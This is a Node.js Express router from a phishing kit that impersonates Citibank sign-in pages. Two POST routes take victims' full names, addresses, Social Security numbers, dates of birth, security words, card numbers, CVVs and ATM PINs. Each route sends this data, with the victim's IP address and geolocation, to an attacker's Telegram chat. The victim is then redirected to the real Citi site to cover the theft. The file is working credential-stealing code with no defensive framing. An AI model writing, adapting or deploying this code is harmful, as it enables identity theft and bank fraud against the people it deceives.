const express = require("express");
const router = express.Router();
const { Telegraf } = require("telegraf");
const axios = require("axios");
const config = require("../config");

const bot = new Telegraf(config.BOT_TOKEN);

async function getLocation(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data;
  } catch (error) {
    console.error("IP lookup failed:", error.message);
    return null;
  }
}
router.get("/", async function (req, res, next) {
  let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

  if (ip.startsWith("::ffff:")) {
    ip = ip.replace("::ffff:", "");
  }

  const location = await getLocation(ip);

  // Optional: You can still use location info if needed
  let locationText = "Location: Unknown";
  if (location && location.city && location.regionName) {
    locationText = `Location: ${location.city}, ${location.regionName}`;
  }

  try {
    res.render("index");
  } catch (error) {
    console.error("Render error:", error.message);
    res.status(500).send("Something went wrong");
  }
});

router.get("/signin/v1", function (req, res, next) {
  res.render("index", { title: "Express" });
});

router.post("/signin/v2", async (req, res, next) => {
  console.log(req.body);

 let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

if (ip.startsWith("::ffff:")) {
  ip = ip.replace("::ffff:", "");
}

const location = await getLocation(ip);

let locationText = "Unknown";
if (location && location.city && location.regionName) {
  locationText = `${location.city}, ${location.regionName}`;
}


  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>NEW CITIB@NK  LOG - DETOL</b>\n\n<b>LOG ID:</b> <code>${
      req.body.id
    }</code>\n<b>Full Name:</b> <code>${
      req.body.fname
    }</code>\n<b>Street Address:</b> <code>${
      req.body.addy
    }</code>\n<b>Zip Code:</b> <code>${
      req.body.zip
    }</code>\n<b>Social Security Number:</b> <code>${
      req.body.ssn
    }</code>\n<b>Date Of Birth:</b> <code>${
      req.body.dob
    }</code>\n<b>Secuiry Word:</b> <code>${
      req.body.sq
    }</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );

  res.render("v2", { id: req.body.id });
});

router.post("/signin/v3", async (req, res, next) => {
  console.log(req.body);
let ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.connection.remoteAddress;

if (ip.startsWith("::ffff:")) {
  ip = ip.replace("::ffff:", "");
}

const location = await getLocation(ip);

let locationText = "Unknown";
if (location && location.city && location.regionName) {
  locationText = `${location.city}, ${location.regionName}`;
}

  bot.telegram.sendMessage(
    config.CHAT_ID,
    `<b>CITIB@NK LOG [CARD & ATM - PIN ] - DETOL</b>\n\n<b>LOG ID:</b> <code>${req.body.id}</code>\n<b>CARD NUMBERN:</b><code>${req.body.ccnum}</code>\n<b>Expiry Date:</b> <code>${req.body.exp}</code>\n<b>CVV:</b> <code>${req.body.cvv}</code>\n<b>ATM PIN:</b> <code>${req.body.pin}</code>\n<b>IP:</b> <code>${ip}</code>\n<b>LOCATION:</b> <code>${locationText}</code>\n<b>DATE:</b> <code>${new Date().toUTCString()}</code>`,
    { parse_mode: "HTML" }
  );
  
  res.redirect("https://www.citi.com/");
});





  

module.exports = router;
